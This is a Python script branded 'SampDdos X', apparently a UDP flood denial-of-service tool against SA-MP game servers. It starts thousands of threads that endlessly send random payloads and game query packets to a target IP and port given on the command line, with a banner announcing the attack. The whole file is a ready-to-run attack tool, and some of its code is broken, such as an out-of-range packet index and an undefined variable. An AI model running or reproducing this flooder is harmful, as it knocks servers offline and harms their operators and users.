# // Import Module
import socket, struct, codecs, sys, threading, random, time, os


if len(sys.argv) >= 3:
    host = str(sys.argv[1])
    port = int(sys.argv[2])
else:
    sys.exit("Usage: python3 "+sys.argv[0]+" <ip> <port/0 for random port>")


# // Vars
if port == "0":
    port = random.randrange(1, 65535)

ip = socket.gethostbyname(host)
Pacotes = [codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'), codecs.decode('53414d509538e1a9611e63', 'hex_codec'), codecs.decode('53414d509538e1a9611e69', 'hex_codec'), codecs.decode('53414d509538e1a9611e72', 'hex_codec'), codecs.decode('081e62da', 'hex_codec'), codecs.decode('081e77da', 'hex_codec'), codecs.decode('081e4dda', 'hex_codec'), codecs.decode('021efd40', 'hex_codec'), codecs.decode('081e7eda', 'hex_codec')]

# // Banner
sys.stdout.write(f"\x1b]2;[@] YooCnc | Attacked to {host}:{port}\x07")
os.system('cls' if os.name == 'nt' else 'clear')
print (f'''

\033[1;35m                     ╔════════════════════════════════════════╗
\033[1;35m                               \033[1;34m╦ ╦╦ ╦╔═╗╔═╗╦═╗  ═╗ ╦
\033[1;35m                               \033[35m╠═╣╚╦╝╠═╝║╣ ╠╦╝  ╔╩╦╝
\033[1;35m                               \033[1;34m╩ ╩ ╩ ╩  ╚═╝╩╚═  ╩ ╚═
\033[1;35m                     ╚════════════════════════════════════════╝
\033[1;34m                        ║  \033[37m      Subscribe YooOfficial         \033[1;34m║
\033[1;35m              ╔════════════════════════════════════════════════════════════╗
\033[1;34m                [\033[34m<>\033[1;34m] \033[37mHOST/IP              \033[1;34m:            [\033[34m<>\033[1;34m] \033[37m{host}
\033[1;34m                [\033[34m<>\033[1;34m] \033[37mPORT                 \033[1;34m:            [\033[34m<>\033[1;34m] \033[37m{port}
\033[1;34m                [\033[34m<>\033[1;34m] \033[37mMETHODS              \033[1;34m:            [\033[34m<>\033[1;34m] \033[37mUDP-FLOOD
\033[1;35m              ╚════════════════════════════════════════════════════════════╝
\033[1;34m                             ║ SAMP-DDOS X
\033[1;34m                  ╔════════════════════════════════════════════════╗
\033[1;34m                  ║  \033[37m  SampDdos X Build By Imyoo 28/06/2023      \033[1;34m║       
\033[1;34m                  ╚════════════════════════════════════════════════╝
\033[0m
''')



class MyThread1(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1024)
            pack = random._urandom(615)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))

class MyThread2(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1021)
            pack = random._urandom(666)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))

class MyThread3(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1180)
            pack = random._urandom(815)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))

class MyThread4(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1092)
            pack = random._urandom(777)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))

class MyThread5(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1209)
            pack = random._urandom(1204)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))

class MyThread6(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(615)
            pack = random._urandom(666)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))

class MyThread7(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1029)
            pack = random._urandom(1026)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))

class MyThread8(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            pack = random._urandom(666)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))

class MyThread9(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1099)
            pack = random._urandom(1023)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))

class MyThread10(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1190)
            pack = random._urandom(1140)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))

class MyThread11(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(666)
            pack = random._urandom(1080)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))

class MyThread12(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(815)
            pack = random._urandom(615)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
            elif int(port) == 7776:
                sock.sendto(Pacotes[3], (ip, int(port)))    
            elif int(port) == 7738:
                sock.sendto(Pacotes[9], (ip, int(port)))
  
if __name__ == '__main__':
    try:
        for x in range(450):
            mythread1 = MyThread1().start()
            mythread2 = MyThread2().start()
            mythread3 = MyThread3().start()
            mythread4 = MyThread4().start()
            mythread5 = MyThread5().start()
            mythread6 = MyThread6().start()
            mythread7 = MyThread7().start()
            mythread8 = MyThread8().start()
            mythread9 = MyThread9().start()
            mythread10 = MyThread10().start()
            mythread11 = MyThread11().start()
            mythread12 = MyThread12().start()
            time.sleep(0.1)
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        print ('\n\n')
        print ('STOP TO ATTACK {}').format(orgip)